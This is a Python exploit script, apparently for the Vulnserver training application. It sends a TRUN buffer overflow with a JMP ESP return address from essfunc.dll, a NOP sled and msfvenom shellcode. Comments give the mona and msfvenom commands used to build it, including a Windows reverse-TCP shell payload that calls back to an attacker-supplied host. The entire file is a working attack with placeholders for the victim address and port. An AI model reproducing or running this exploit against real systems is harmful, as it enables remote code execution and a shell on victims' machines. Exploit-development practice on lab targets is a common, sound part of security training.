#!/usr/bin/python
#\x00
import socket,sys


victimIp = 'xxx.xxx.xxx.xx'       # Enter Victim's IP Address 
victimPort = xxxx                 # Enter Victim's Port

#/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
# jmp esp
#!mona find -s '\xff\xe4' -m essfunc.dll
# 625011AF
# msfvenom -p windows/shell_reverse_tcp LHOST=xxxx LPORT=xxxx EXITFUNC=thread -f c -a x86 -b "\x00"

overflow =("\xbb\x6c\xeb\x79\xec\xdb\xde\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x83\xea\xfc\x31\x5a\x0e\x03\x36\xe5\x9b\x19\x3a\x11\xd9"
"\xe2\xc2\xe2\xbe\x6b\x27\xd3\xfe\x08\x2c\x44\xcf\x5b\x60\x69"
"\xa4\x0e\x90\xfa\xc8\x86\x97\x4b\x66\xf1\x96\x4c\xdb\xc1\xb9"
"\xce\x26\x16\x19\xee\xe8\x6b\x58\x37\x14\x81\x08\xe0\x52\x34"
"\xbc\x85\x2f\x85\x37\xd5\xbe\x8d\xa4\xae\xc1\xbc\x7b\xa4\x9b"
"\x1e\x7a\x69\x90\x16\x64\x6e\x9d\xe1\x1f\x44\x69\xf0\xc9\x94"
"\x92\x5f\x34\x19\x61\xa1\x71\x9e\x9a\xd4\x8b\xdc\x27\xef\x48"
"\x9e\xf3\x7a\x4a\x38\x77\xdc\xb6\xb8\x54\xbb\x3d\xb6\x11\xcf"
"\x19\xdb\xa4\x1c\x12\xe7\x2d\xa3\xf4\x61\x75\x80\xd0\x2a\x2d"
"\xa9\x41\x97\x80\xd6\x91\x78\x7c\x73\xda\x95\x69\x0e\x81\xf1"
"\x5e\x23\x39\x02\xc9\x34\x4a\x30\x56\xef\xc4\x78\x1f\x29\x13"
"\x7e\x0a\x8d\x8b\x81\xb5\xee\x82\x45\xe1\xbe\xbc\x6c\x8a\x54"
"\x3c\x90\x5f\xfa\x6c\x3e\x30\xbb\xdc\xfe\xe0\x53\x36\xf1\xdf"
"\x44\x39\xdb\x77\xee\xc0\x8c\xb7\x47\xae\x49\x50\x9a\x2e\x43"
"\xfc\x13\xc8\x09\xec\x75\x43\xa6\x95\xdf\x1f\x57\x59\xca\x5a"
"\x57\xd1\xf9\x9b\x16\x12\x77\x8f\xcf\xd2\xc2\xed\x46\xec\xf8"
"\x99\x05\x7f\x67\x59\x43\x9c\x30\x0e\x04\x52\x49\xda\xb8\xcd"
"\xe3\xf8\x40\x8b\xcc\xb8\x9e\x68\xd2\x41\x52\xd4\xf0\x51\xaa"
"\xd5\xbc\x05\x62\x80\x6a\xf3\xc4\x7a\xdd\xad\x9e\xd1\xb7\x39"
"\x66\x1a\x08\x3f\x67\x77\xfe\xdf\xd6\x2e\x47\xe0\xd7\xa6\x4f"
"\x99\x05\x57\xaf\x70\x8e\x77\x52\x50\xfb\x1f\xcb\x31\x46\x42"
"\xec\xec\x85\x7b\x6f\x04\x76\x78\x6f\x6d\x73\xc4\x37\x9e\x09"
"\x55\xd2\xa0\xbe\x56\xf7")

buf  =  "TRUN /.:/" + "A"*2003 + "\xAF\x11\x50\x62" + "\x90" * 10 + overflow

try:
    print ('[+] Sending buffer')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((victimIp,victimPort))
    s.recv(1024)			
    s.send(buf)
    s.close()
except:
    print "Error in connection"

